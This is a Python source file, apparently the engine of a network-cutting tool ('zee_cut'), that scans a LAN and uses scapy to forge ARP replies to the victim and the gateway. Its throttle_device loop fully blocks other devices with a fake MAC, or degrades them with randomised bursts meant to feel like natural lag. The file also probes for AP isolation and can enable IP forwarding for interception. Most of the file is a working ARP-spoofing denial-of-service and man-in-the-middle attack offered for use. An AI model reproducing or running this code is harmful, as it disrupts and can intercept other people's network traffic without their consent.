"""
Network Scanner & ARP Throttler Engine
Handles network scanning, ARP spoofing for throttling, and device management.
Uses multiple scan methods for maximum device detection.
"""

from __future__ import annotations

import json
import logging
import random
import socket
import struct
import threading
import time
from concurrent.futures import Future, ThreadPoolExecutor
from dataclasses import replace
from datetime import datetime, timezone
from pathlib import Path
from typing import Callable, Optional

try:
    from scapy.all import ARP, IFACES, Ether, conf, getmacbyip, sendp, srp
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

import psutil

from core.admin import is_admin as check_admin
from core.models import NetworkDevice, NetworkInterface
from core.oui import lookup_vendor
from core.platform import disable_ip_forwarding as _platform_disable_ip_forwarding
from core.platform import enable_ip_forwarding as _platform_enable_ip_forwarding
from core.platform import flush_arp_cache as _platform_flush_arp
from core.platform import (
    get_default_gateway,
    ping_command,
    read_arp_table,
    read_ip_forwarding_state,
    subprocess_run,
)


class NetworkEngine:
    """Core engine for network scanning and ARP-based throttling."""

    def __init__(self) -> None:
        self.log_file: Path = Path(__file__).resolve().parent.parent / "logs" / "network_engine.log"
        self._logger: logging.Logger = self._build_logger()
        self.devices: dict[str, NetworkDevice] = {}
        self.interface: Optional[NetworkInterface] = None
        self._state_lock: threading.RLock = threading.RLock()
        self._throttle_threads: dict[str, threading.Thread] = {}
        self._throttle_stop_events: dict[str, threading.Event] = {}
        self._scan_thread: Optional[threading.Thread] = None
        self._running: bool = False
        self._hostname_cache: dict[str, str] = {}
        self._hostname_futures: dict[str, Future] = {}
        self._hostname_lock: threading.Lock = threading.Lock()
        self._hostname_executor: ThreadPoolExecutor = ThreadPoolExecutor(max_workers=8)
        self._ip_forwarding_original: Optional[int] = None
        self._ip_forwarding_enabled_by_app: bool = False
        self._scan_sequence: int = 0
        self._last_scan_summary: dict[str, object] = {}
        self._ap_isolation_detected: bool = False
        self.on_devices_updated: Optional[Callable[[], None]] = None
        self.on_status_changed: Optional[Callable[[str], None]] = None
        self._logger.info("NetworkEngine initialized")

    def _build_logger(self) -> logging.Logger:
        """Build file logger for diagnostics."""
        logger = logging.getLogger("zee_cut.network_engine")
        logger.setLevel(logging.INFO)
        logger.propagate = False

        if not logger.handlers:
            self.log_file.parent.mkdir(parents=True, exist_ok=True)
            handler = logging.FileHandler(self.log_file, encoding="utf-8")
            handler.setFormatter(logging.Formatter(
                "%(asctime)s | %(levelname)s | %(message)s"
            ))
            logger.addHandler(handler)

        return logger

    def get_devices_snapshot(self) -> list[NetworkDevice]:
        """Return a thread-safe snapshot copy of current devices."""
        with self._state_lock:
            return [replace(device) for device in self.devices.values()]

    def get_device_snapshot(self, ip: str) -> Optional[NetworkDevice]:
        """Return a copy of one device, if present."""
        with self._state_lock:
            device = self.devices.get(ip)
            return replace(device) if device else None

    def get_throttled_count(self) -> int:
        """Return throttled device count in a thread-safe manner."""
        with self._state_lock:
            return sum(1 for dev in self.devices.values() if dev.is_throttled)

    def get_interface_snapshot(self) -> Optional[NetworkInterface]:
        """Return a copy of the active interface, if set."""
        with self._state_lock:
            return replace(self.interface) if self.interface else None

    def get_last_scan_summary(self) -> dict:
        """Return latest scan summary."""
        with self._state_lock:
            return dict(self._last_scan_summary)

    def _next_scan_session_id(self) -> str:
        """Generate monotonic scan session id."""
        with self._state_lock:
            self._scan_sequence += 1
            sequence = self._scan_sequence
        return f"scan-{sequence:04d}"

    def _build_scan_log_event(self, event: str, **fields: object) -> str:
        """Build structured scan event payload."""
        payload = {
            "event": event,
            "ts": datetime.now(timezone.utc).isoformat(timespec="seconds"),
            **fields,
        }
        return json.dumps(payload, separators=(",", ":"))

    def get_interfaces(self) -> list[NetworkInterface]:
        """Get all available network interfaces, matching psutil with scapy."""
        interfaces = []
        net_if = psutil.net_if_addrs()
        net_stats = psutil.net_if_stats()

        # Build scapy interface lookup by IP
        scapy_iface_map = {}
        if SCAPY_AVAILABLE:
            try:
                for iface in IFACES.values():
                    try:
                        ip = getattr(iface, 'ip', None) or getattr(iface, 'ips', [None])[0]
                        if ip and ip != '127.0.0.1' and ip != '0.0.0.0':
                            scapy_iface_map[ip] = iface
                    except Exception:
                        pass
            except Exception:
                pass

        for iface_name, addrs in net_if.items():
            if iface_name in net_stats and not net_stats[iface_name].isup:
                continue

            ipv4 = None
            mac = None
            subnet = "255.255.255.0"
            for addr in addrs:
                if addr.family == socket.AF_INET and addr.address != "127.0.0.1":
                    ipv4 = addr.address
                    subnet = addr.netmask or "255.255.255.0"
                elif addr.family == psutil.AF_LINK:
                    mac = addr.address

            if ipv4 and mac:
                gateway_ip = self._get_default_gateway(ipv4)
                scapy_if = scapy_iface_map.get(ipv4, None)

                iface = NetworkInterface(
                    name=iface_name,
                    display_name=iface_name,
                    ip=ipv4,
                    mac=mac.replace("-", ":").lower(),
                    gateway_ip=gateway_ip,
                    subnet_mask=subnet,
                    scapy_iface=scapy_if
                )
                interfaces.append(iface)

        return interfaces

    def _get_default_gateway(self, interface_ip: str) -> str:
        """Find the default gateway for the given interface IP."""
        return get_default_gateway(interface_ip)

    def _is_same_subnet(self, ip1: str, ip2: str, mask: str = "255.255.255.0") -> bool:
        """Check if two IPs are in the same subnet."""
        try:
            ip1_int = struct.unpack('!I', socket.inet_aton(ip1))[0]
            ip2_int = struct.unpack('!I', socket.inet_aton(ip2))[0]
            mask_int = struct.unpack('!I', socket.inet_aton(mask))[0]
            return (ip1_int & mask_int) == (ip2_int & mask_int)
        except Exception:
            return False

    def set_interface(self, interface: NetworkInterface) -> None:
        """Set the active network interface."""
        with self._state_lock:
            self.interface = interface

        # Also set scapy's default interface
        if SCAPY_AVAILABLE and interface.scapy_iface:
            try:
                conf.iface = interface.scapy_iface
                self._notify_status(
                    f"Interface: {interface.display_name} ({interface.ip}) - Scapy OK"
                )
            except Exception:
                self._notify_status(
                    f"Interface: {interface.display_name} ({interface.ip}) - Scapy fallback"
                )
        else:
            self._notify_status(f"Interface: {interface.display_name} ({interface.ip})")

    def scan_network(
        self,
        callback: Optional[Callable] = None,
        fast_mode: bool = True,
        flush_before_scan: bool = True,
    ):
        """Scan devices on the selected network interface."""
        with self._state_lock:
            self._ap_isolation_detected = False
            if not self.interface:
                self._notify_status("ERROR: No interface selected!")
                return
            interface_ip = self.interface.ip
            interface_mac = self.interface.mac
            interface_name = self.interface.display_name
            gateway_ip = self.interface.gateway_ip

        if not interface_ip:
            self._notify_status("ERROR: No interface selected!")
            return

        scan_id = self._next_scan_session_id()

        def _scan():
            self._notify_status("Scanning network (multi-method)...")
            started_at = time.time()
            ping_fallback_used = False
            try:
                self._logger.info(
                    self._build_scan_log_event(
                        "scan.start",
                        scan_id=scan_id,
                        fast_mode=fast_mode,
                        flush_before_scan=flush_before_scan,
                        interface_ip=interface_ip,
                        interface_name=interface_name,
                        gateway_ip=gateway_ip,
                    )
                )

                with self._state_lock:
                    previous_devices = list(self.devices.values())
                previous_target_count = len([
                    d for d in previous_devices
                    if not d.is_self and not d.is_gateway
                ])
                with self._state_lock:
                    previous_throttle_levels = {
                        ip: self.devices[ip].throttle_level
                        for ip in self._throttle_threads
                        if ip in self.devices
                    }

                # Start each scan from a clean device list.
                # Run aggressive realtime mode:
                # 1) flush ARP cache to remove stale device cache
                # 2) actively warm ARP with ping sweep
                # 3) perform multi-pass ARP discovery
                flush_ok = None
                if flush_before_scan and self.is_admin():
                    self._notify_status("Pre-scan: Flushing ARP cache...")
                    flush_ok, _ = self.flush_arp_cache(notify=False)
                    self._logger.info(
                        self._build_scan_log_event(
                            "scan.flush_arp",
                            scan_id=scan_id,
                            success=bool(flush_ok),
                        )
                    )

                with self._state_lock:
                    self.devices.clear()

                # Method 1: Ping sweep warm-up to force fresh ARP entries.
                self._notify_status("Step 1/4: Realtime ping warm-up...")
                if fast_mode:
                    self._ping_sweep(timeout_ms=280, workers=72)
                else:
                    self._ping_sweep(timeout_ms=320, workers=96)

                # Method 2: ARP table from system (fresh after warm-up)
                self._notify_status("Step 2/4: Reading ARP table...")
                self._scan_arp_table()

                # Method 3: Scapy ARP broadcast (active layer-2 discovery)
                if SCAPY_AVAILABLE:
                    self._notify_status("Step 3/4: ARP scan (scapy)...")
                    if fast_mode:
                        self._scan_scapy_arp(timeout=2, retry=1)
                    else:
                        self._scan_scapy_arp(timeout=4, retry=2)

                # Method 4: Final refresh pass to catch slow/late responders.
                self._notify_status("Step 4/4: Final refresh pass...")
                self._ping_sweep(timeout_ms=260, workers=72)
                self._scan_arp_table()
                if SCAPY_AVAILABLE:
                    self._scan_scapy_arp(timeout=2, retry=1)

                # Optional fallback when quick discovery is still too low.
                with self._state_lock:
                    discovered_targets = len([
                        d for d in self.devices.values()
                        if not d.is_self and not d.is_gateway
                    ])
                self._logger.info(
                    "Scan quick pass targets=%s previous_targets=%s fast_mode=%s",
                    discovered_targets,
                    previous_target_count,
                    fast_mode
                )
                expected_min_targets = 2
                if previous_target_count > 0:
                    expected_min_targets = max(2, int(previous_target_count * 0.6))

                if not fast_mode or discovered_targets < expected_min_targets:
                    ping_fallback_used = True
                    self._notify_status("Fallback: extended active discovery...")
                    self._ping_sweep(timeout_ms=360, workers=96)
                    self._scan_arp_table()
                    if SCAPY_AVAILABLE:
                        self._scan_scapy_arp(timeout=3, retry=2)

                # Resolve gateway MAC
                self._resolve_gateway_mac()

                # Ensure self and gateway still exist in list even if they don't answer scan.
                self._add_or_update_device(interface_ip, interface_mac)
                with self._state_lock:
                    if interface_ip in self.devices:
                        self.devices[interface_ip].is_self = True
                    gateway_ip_current = self.interface.gateway_ip if self.interface else ""
                    gateway_mac_current = self.interface.gateway_mac if self.interface else ""
                if gateway_ip_current and gateway_mac_current:
                    self._add_or_update_device(gateway_ip_current, gateway_mac_current)
                    with self._state_lock:
                        if gateway_ip_current in self.devices:
                            self.devices[gateway_ip_current].is_gateway = True

                # Restore UI throttled state for active throttles.
                with self._state_lock:
                    for ip, level in previous_throttle_levels.items():
                        if ip in self.devices and ip in self._throttle_threads:
                            self.devices[ip].is_throttled = True
                            self.devices[ip].throttle_level = level

                # Stop throttle threads for stale/offline IPs.
                with self._state_lock:
                    active_ips = set(self.devices.keys())
                    stale_ips = [ip for ip in self._throttle_threads.keys() if ip not in active_ips]
                for ip in stale_ips:
                    self._logger.info("Stopping orphan throttle for stale ip=%s", ip)
                    self.restore_device(ip)

                with self._state_lock:
                    device_count = len([
                        d for d in self.devices.values()
                        if not d.is_self and not d.is_gateway
                    ])
                    throttled_count = sum(1 for d in self.devices.values() if d.is_throttled)
                elapsed = time.time() - started_at
                self._notify_status(f"Found {device_count} devices on network ({elapsed:.1f}s)")
                summary = {
                    "scan_id": scan_id,
                    "completed_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
                    "elapsed_s": round(elapsed, 2),
                    "device_count": device_count,
                    "throttled_count": throttled_count,
                    "fast_mode": fast_mode,
                    "flush_before_scan": flush_before_scan,
                    "flush_success": bool(flush_ok) if flush_ok is not None else None,
                    "ping_fallback_used": ping_fallback_used,
                    "previous_target_count": previous_target_count,
                }
                with self._state_lock:
                    self._last_scan_summary = summary

                with self._hostname_lock:
                    active_ips = set(self.devices.keys())
                    stale_hostnames = [ip for ip in self._hostname_cache if ip not in active_ips]
                    for ip in stale_hostnames:
                        self._hostname_cache.pop(ip, None)
                    for ip in stale_hostnames:
                        future = self._hostname_futures.pop(ip, None)
                        if future and not future.done():
                            future.cancel()

                self._detect_ap_isolation()

                self._logger.info(self._build_scan_log_event("scan.finish", **summary))

                if self.on_devices_updated:
                    self.on_devices_updated()
                if callback:
                    callback()

            except Exception as e:
                self._notify_status(f"Scan error: {str(e)}")
                elapsed = time.time() - started_at
                self._logger.exception(
                    self._build_scan_log_event(
                        "scan.error",
                        scan_id=scan_id,
                        elapsed_s=round(elapsed, 2),
                        error=str(e),
                    )
                )
                if callback:
                    callback()

        self._scan_thread = threading.Thread(target=_scan, daemon=True)
        self._scan_thread.start()

    def _scan_arp_table(self) -> None:
        """Read devices from system ARP table (cross-platform)."""
        try:
            with self._state_lock:
                if not self.interface:
                    return
                subnet_prefix = '.'.join(self.interface.ip.split('.')[:3]) + '.'

            for ip, mac in read_arp_table(subnet_prefix):
                self._add_or_update_device(ip, mac)

        except Exception as e:
            self._notify_status(f"ARP table scan error: {e}")

    def _ping_sweep(self, timeout_ms: int = 250, workers: int = 64) -> None:
        """Fast parallel ping sweep to warm ARP cache (cross-platform)."""
        try:
            subnet_prefix = '.'.join(self.interface.ip.split('.')[:3])
            ips = [f"{subnet_prefix}.{i}" for i in range(1, 255)]

            def ping_ip(ip: str):
                try:
                    subprocess_run(
                        ping_command(ip, timeout_ms),
                        timeout=2,
                    )
                except Exception:
                    pass

            with ThreadPoolExecutor(max_workers=min(workers, 48)) as pool:
                list(pool.map(ping_ip, ips))
        except Exception:
            pass

    def _scan_scapy_arp(self, timeout: int = 4, retry: int = 2) -> None:
        """Scan using scapy ARP requests."""
        if not SCAPY_AVAILABLE:
            return

        try:
            target_ip = self._get_network_range()

            arp_request = ARP(pdst=target_ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast / arp_request

            # Use the mapped scapy interface if available
            iface = self.interface.scapy_iface if self.interface.scapy_iface else conf.iface

            answered, _ = srp(
                packet, timeout=timeout, verbose=False, retry=retry, iface=iface
            )

            for sent, received in answered:
                ip = received.psrc
                mac = received.hwsrc.lower()
                self._add_or_update_device(ip, mac)

        except Exception as e:
            self._notify_status(f"Scapy ARP scan: {e}")

    def _resolve_gateway_mac(self) -> None:
        """Resolve the gateway MAC address."""
        with self._state_lock:
            if not self.interface or not self.interface.gateway_ip:
                return
            gw_ip = self.interface.gateway_ip

        # Check if gateway is already in devices
        with self._state_lock:
            if gw_ip in self.devices:
                self.interface.gateway_mac = self.devices[gw_ip].mac
                self.devices[gw_ip].is_gateway = True
                return

        # Try getmacbyip
        if SCAPY_AVAILABLE:
            try:
                gw_mac = getmacbyip(gw_ip)
                if gw_mac:
                    with self._state_lock:
                        if self.interface:
                            self.interface.gateway_mac = gw_mac.lower()
                    self._add_or_update_device(gw_ip, gw_mac.lower())
                    with self._state_lock:
                        if gw_ip in self.devices:
                            self.devices[gw_ip].is_gateway = True
                    return
            except Exception:
                pass

        # Fallback: read from arp table (cross-platform)
        try:
            with self._state_lock:
                if not self.interface:
                    return
                subnet_prefix = '.'.join(self.interface.ip.split('.')[:3]) + '.'
            for ip, mac in read_arp_table(subnet_prefix):
                if ip == gw_ip:
                    with self._state_lock:
                        if self.interface:
                            self.interface.gateway_mac = mac
                    self._add_or_update_device(gw_ip, mac)
                    with self._state_lock:
                        if gw_ip in self.devices:
                            self.devices[gw_ip].is_gateway = True
                    return
        except Exception:
            pass

    def _add_or_update_device(self, ip: str, mac: str) -> None:
        """Add or update a device in the device list."""
        with self._state_lock:
            is_gateway = (ip == self.interface.gateway_ip) if self.interface else False
            is_self = (ip == self.interface.ip) if self.interface else False

        hostname = self._hostname_cache.get(ip, "Unknown")
        vendor = lookup_vendor(mac)

        with self._state_lock:
            if ip in self.devices:
                dev = self.devices[ip]
                dev.mac = mac
                if hostname != "Unknown":
                    dev.hostname = hostname
                if dev.vendor == "Unknown" and vendor != "Unknown":
                    dev.vendor = vendor
                dev.is_gateway = is_gateway
                dev.is_self = is_self
                dev.last_seen = time.time()
            else:
                self.devices[ip] = NetworkDevice(
                    ip=ip,
                    mac=mac,
                    hostname=hostname,
                    vendor=vendor,
                    is_gateway=is_gateway,
                    is_self=is_self,
                    last_seen=time.time()
                )

        if hostname == "Unknown":
            self._queue_hostname_resolution(ip)

    def _queue_hostname_resolution(self, ip: str) -> None:
        """Resolve hostnames in background to avoid slowing down network scan."""
        with self._hostname_lock:
            if ip in self._hostname_cache:
                return

            pending = self._hostname_futures.get(ip)
            if pending and not pending.done():
                return

            future = self._hostname_executor.submit(self._resolve_hostname, ip)
            self._hostname_futures[ip] = future
            future.add_done_callback(
                lambda fut, target_ip=ip: self._on_hostname_resolved(target_ip, fut)
            )

    def _on_hostname_resolved(self, ip: str, future: Future) -> None:
        try:
            hostname = future.result()
        except Exception:
            hostname = "Unknown"

        with self._hostname_lock:
            self._hostname_futures.pop(ip, None)
            self._hostname_cache[ip] = hostname

        with self._state_lock:
            if hostname != "Unknown" and ip in self.devices:
                self.devices[ip].hostname = hostname
                should_notify = True
            else:
                should_notify = False

        if should_notify and self.on_devices_updated:
            self.on_devices_updated()

    def _get_network_range(self) -> str:
        """Calculate the network range from interface IP and subnet mask."""
        with self._state_lock:
            if not self.interface:
                return "0.0.0.0/24"
            ip = self.interface.ip
            mask = self.interface.subnet_mask

        ip_int = struct.unpack('!I', socket.inet_aton(ip))[0]
        mask_int = struct.unpack('!I', socket.inet_aton(mask))[0]
        network_int = ip_int & mask_int

        cidr = bin(mask_int).count('1')
        network_ip = socket.inet_ntoa(struct.pack('!I', network_int))

        return f"{network_ip}/{cidr}"

    def _resolve_hostname(self, ip: str) -> str:
        """Try to resolve IP to hostname."""
        try:
            hostname = socket.gethostbyaddr(ip)[0]
            return hostname
        except (socket.herror, socket.gaierror, OSError):
            return "Unknown"

    def _blackhole_mac(self, ip: str) -> str:
        """Generate a locally-administered fake MAC for hard block mode."""
        try:
            last_octet = int(ip.split('.')[-1]) & 0xFF
        except Exception:
            last_octet = 0
        return f"02:00:00:00:00:{last_octet:02x}"

    def _send_arp_reply(
        self,
        target_ip: str,
        target_mac: str,
        claimed_ip: str,
        claimed_mac: str,
        count: int = 1
    ):
        """Send ARP is-at via L2 with explicit Ethernet destination."""
        with self._state_lock:
            if not self.interface or not target_mac:
                return
            iface = self.interface.scapy_iface if self.interface.scapy_iface else conf.iface

        # Keep Ethernet source as NIC MAC (default) to avoid AP anti-spoof side effects.
        unicast = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=claimed_ip,
            hwsrc=claimed_mac
        )
        sendp(unicast, verbose=False, count=count, iface=iface)

        # Also send broadcast is-at for clients that refresh ARP from broadcasts only.
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
            op=2,
            pdst=target_ip,
            hwdst="ff:ff:ff:ff:ff:ff",
            psrc=claimed_ip,
            hwsrc=claimed_mac
        )
        sendp(broadcast, verbose=False, count=max(1, count // 2), iface=iface)

    def throttle_device(self, ip: str, level: int = 0) -> None:
        """
        Throttle a device using ARP spoofing.
        level: 0 = full block, 50 = intermittent, 100 = normal
        """
        if not SCAPY_AVAILABLE:
            self._notify_status("ERROR: Scapy not available!")
            return

        with self._state_lock:
            device = self.devices.get(ip)
            interface = self.interface
            if not device:
                return
            if device.is_self or device.is_gateway:
                return
            if not interface or not interface.gateway_mac:
                interface_ok = False
            else:
                interface_ok = True
                gateway_ip = interface.gateway_ip
                gateway_mac = interface.gateway_mac
                target_mac = device.mac
                iface_ip = interface.ip
                iface_mac = interface.mac

        if not interface_ok:
            self._notify_status("ERROR: Gateway MAC not found. Scan first!")
            return

        self.restore_device(ip)

        if level >= 100:
            return

        stop_event = threading.Event()
        with self._state_lock:
            current = self.devices.get(ip)
            if not current:
                return
            current.is_throttled = True
            current.throttle_level = level
            self._throttle_stop_events[ip] = stop_event

        def _spoof_loop():
            self._notify_status(f"Throttling {ip} (level: {100 - level}%)")
            self._logger.info(
                "Throttle start ip=%s level=%s iface_ip=%s gateway_ip=%s target_mac=%s gateway_mac=%s",
                ip,
                level,
                iface_ip,
                gateway_ip,
                target_mac,
                gateway_mac
            )
            spoof_hwsrc = self._blackhole_mac(ip) if level == 0 else iface_mac
            cycle = 0

            def _corrective_pulse():
                for _ in range(2):
                    self._send_arp_reply(
                        target_ip=ip, target_mac=target_mac,
                        claimed_ip=gateway_ip, claimed_mac=gateway_mac,
                        count=3
                    )
                    self._send_arp_reply(
                        target_ip=gateway_ip, target_mac=gateway_mac,
                        claimed_ip=ip, claimed_mac=target_mac,
                        count=3
                    )
                    time.sleep(0.1)

            while not stop_event.is_set():
                try:
                    if level == 0:
                        poison_count = 5
                        self._send_arp_reply(
                            target_ip=ip, target_mac=target_mac,
                            claimed_ip=gateway_ip, claimed_mac=spoof_hwsrc,
                            count=poison_count
                        )
                        self._send_arp_reply(
                            target_ip=gateway_ip, target_mac=gateway_mac,
                            claimed_ip=ip, claimed_mac=spoof_hwsrc,
                            count=poison_count
                        )
                        stop_event.wait(0.2)
                        continue

                    # Shaped throttling: variable timing for natural feel
                    if level <= 25:
                        slice_on = 0.4
                        slice_off = 0.6
                        pcount = 3
                    elif level <= 50:
                        slice_on = 0.3
                        slice_off = 1.5
                        pcount = 2
                    elif level <= 75:
                        slice_on = 0.2
                        slice_off = 2.5
                        pcount = 1
                    else:
                        slice_on = 0.2
                        slice_off = 4.0
                        pcount = 1

                    # Poison burst
                    self._send_arp_reply(
                        target_ip=ip, target_mac=target_mac,
                        claimed_ip=gateway_ip, claimed_mac=spoof_hwsrc,
                        count=pcount
                    )
                    self._send_arp_reply(
                        target_ip=gateway_ip, target_mac=gateway_mac,
                        claimed_ip=ip, claimed_mac=spoof_hwsrc,
                        count=pcount
                    )
                    stop_event.wait(slice_on)

                    # Every ~8 cycles insert a corrective pulse
                    # so the target briefly recovers, creating a lag-like feel
                    if level >= 30 and cycle % 8 == 0:
                        _corrective_pulse()

                    stop_event.wait(random.uniform(0.1, slice_off))
                    cycle += 1

                except Exception as e:
                    self._notify_status(f"Spoof error for {ip}: {e}")
                    self._logger.exception("Spoof loop error ip=%s", ip)
                    stop_event.wait(2)

        thread = threading.Thread(target=_spoof_loop, daemon=True)
        with self._state_lock:
            self._throttle_threads[ip] = thread
        thread.start()

    def restore_device(self, ip: str) -> None:
        """Restore a device to normal network operation."""
        with self._state_lock:
            stop_event = self._throttle_stop_events.pop(ip, None)
            thread = self._throttle_threads.pop(ip, None)

        if stop_event:
            stop_event.set()

        if thread:
            thread.join(timeout=3)

        with self._state_lock:
            device = self.devices.get(ip)
            interface = self.interface
            if not device:
                return
            is_target = bool(interface and not device.is_self and not device.is_gateway)
            device_mac = device.mac

        if is_target:
            try:
                with self._state_lock:
                    gateway_mac = interface.gateway_mac if interface else ""
                if not gateway_mac:
                    self._resolve_gateway_mac()
                    with self._state_lock:
                        gateway_mac = self.interface.gateway_mac if self.interface else ""
                if not gateway_mac:
                    self._scan_arp_table()
                    self._resolve_gateway_mac()
                    with self._state_lock:
                        gateway_mac = self.interface.gateway_mac if self.interface else ""

                if gateway_mac and interface:
                    # Send multiple corrective ARP bursts so recovery is faster.
                    for _ in range(3):
                        # Correct ARP to target (gateway IP -> gateway MAC)
                        self._send_arp_reply(
                            target_ip=ip,
                            target_mac=device_mac,
                            claimed_ip=interface.gateway_ip,
                            claimed_mac=gateway_mac,
                            count=7
                        )

                        # Correct ARP to gateway (target IP -> target MAC)
                        self._send_arp_reply(
                            target_ip=interface.gateway_ip,
                            target_mac=gateway_mac,
                            claimed_ip=ip,
                            claimed_mac=device_mac,
                            count=7
                        )
                        time.sleep(0.2)

                    self._notify_status(f"Restored {ip} to normal")
                else:
                    self._notify_status(
                        f"Restore warning for {ip}: gateway MAC not found, recovery may be slower"
                    )
            except Exception as e:
                self._notify_status(f"Restore error for {ip}: {e}")
                self._logger.exception("Restore error ip=%s", ip)

        with self._state_lock:
            device = self.devices.get(ip)
            if device:
                device.is_throttled = False
                device.throttle_level = 100

    def restore_all(self) -> None:
        """Restore all throttled devices in parallel."""
        with self._state_lock:
            throttled = [ip for ip, dev in self.devices.items() if dev.is_throttled]
        if not throttled:
            return
        with ThreadPoolExecutor(max_workers=min(8, len(throttled))) as pool:
            for _ in pool.map(self.restore_device, throttled):
                pass
        self._notify_status("All devices restored to normal")

    def cleanup(self) -> None:
        """Clean up all spoofing before exit."""
        with self._state_lock:
            self._running = False
        self.restore_all()
        try:
            self._hostname_executor.shutdown(wait=False, cancel_futures=True)
        except Exception:
            pass

    def get_diagnostics_snapshot(self, log_tail_lines: int = 200) -> dict:
        """Return diagnostic payload for support/export use."""
        with self._state_lock:
            interface = replace(self.interface) if self.interface else None
            devices = [replace(device) for device in self.devices.values()]
            throttled_ips = [ip for ip, device in self.devices.items() if device.is_throttled]
            throttle_thread_count = len(self._throttle_threads)
            scan_summary = dict(self._last_scan_summary)

        if interface:
            interface_payload = vars(interface).copy()
            interface_payload["scapy_iface"] = str(interface_payload.get("scapy_iface", ""))
        else:
            interface_payload = None

        payload = {
            "generated_at": datetime.now(timezone.utc).isoformat(timespec="seconds"),
            "interface": interface_payload,
            "device_count": len(devices),
            "throttled_count": len(throttled_ips),
            "throttled_ips": throttled_ips,
            "throttle_thread_count": throttle_thread_count,
            "last_scan_summary": scan_summary,
            "ap_isolation_detected": self._ap_isolation_detected,
            "devices": [vars(device) for device in devices],
            "log_tail": self._read_log_tail(log_tail_lines),
        }
        return payload

    def _read_log_tail(self, lines: int = 200) -> list[str]:
        """Read tail lines from engine log file."""
        try:
            if not self.log_file.exists():
                return []
            with self.log_file.open("r", encoding="utf-8", errors="replace") as handle:
                content = handle.readlines()
            return [line.rstrip("\n") for line in content[-max(0, lines):]]
        except Exception:
            return []

    def _notify_status(self, message: str) -> None:
        """Send status update."""
        self._logger.info(message)
        if self.on_status_changed:
            self.on_status_changed(message)

    def is_admin(self) -> bool:
        """Check if running with admin/elevated privileges."""
        return check_admin()

    def get_ap_isolation_detected(self) -> bool:
        """Return whether AP isolation was detected."""
        with self._state_lock:
            return self._ap_isolation_detected

    def _detect_ap_isolation(self) -> None:
        """
        Detect AP isolation by sending a unicast ARP request to a discovered
        non-gateway client. If broadcast scan discovered the client but unicast
        ARP gets no reply, AP isolation is likely enabled on the access point.
        """
        if not SCAPY_AVAILABLE:
            return
        with self._state_lock:
            candidates = [
                (ip, dev.mac) for ip, dev in self.devices.items()
                if not dev.is_self and not dev.is_gateway
            ]
            if not candidates:
                return
            ip, mac = candidates[0]
            iface = self.interface.scapy_iface if self.interface and self.interface.scapy_iface else conf.iface
        try:
            arp_req = Ether(dst=mac) / ARP(op=1, pdst=ip, hwdst=mac)
            ans, _ = srp(arp_req, timeout=2, verbose=False, iface=iface)
            with self._state_lock:
                self._ap_isolation_detected = len(ans) == 0
            if self._ap_isolation_detected:
                self._logger.warning(
                    "AP isolation detected — unicast ARP to %s (%s) failed",
                    ip, mac
                )
                self._notify_status(
                    "WARNING: AP isolation may be active. ARP spoof may not work."
                )
        except Exception as e:
            self._logger.debug("AP isolation check error: %s", e)

    def _read_ip_forwarding_state(self) -> Optional[int]:
        """Read IP forwarding state (cross-platform)."""
        return read_ip_forwarding_state()

    def enable_ip_forwarding(self) -> None:
        """Enable IP forwarding (cross-platform)."""
        try:
            current_state = self._read_ip_forwarding_state()
            self._ip_forwarding_original = current_state

            if current_state == 1:
                self._ip_forwarding_enabled_by_app = False
                self._notify_status("IP Forwarding already enabled")
                return

            ok, msg = _platform_enable_ip_forwarding()
            self._ip_forwarding_enabled_by_app = ok
            self._notify_status(msg)
        except Exception as e:
            self._notify_status(f"Failed to enable IP forwarding: {e}")

    def disable_ip_forwarding(self) -> None:
        """Disable IP forwarding (cross-platform)."""
        if not self._ip_forwarding_enabled_by_app:
            self._logger.info(
                "Skip disabling IP forwarding because app did not enable it."
            )
            return

        try:
            _platform_disable_ip_forwarding()
            self._notify_status("IP Forwarding restored to previous state")
        except Exception:
            pass
        finally:
            self._ip_forwarding_enabled_by_app = False
            self._ip_forwarding_original = None

    def flush_arp_cache(self, notify: bool = True) -> tuple[bool, str]:
        """Flush system ARP cache (cross-platform)."""
        ok, message = _platform_flush_arp()
        if notify:
            (self._notify_status if ok else self._logger.info)(message)
        else:
            self._logger.info(message)
        return ok, message

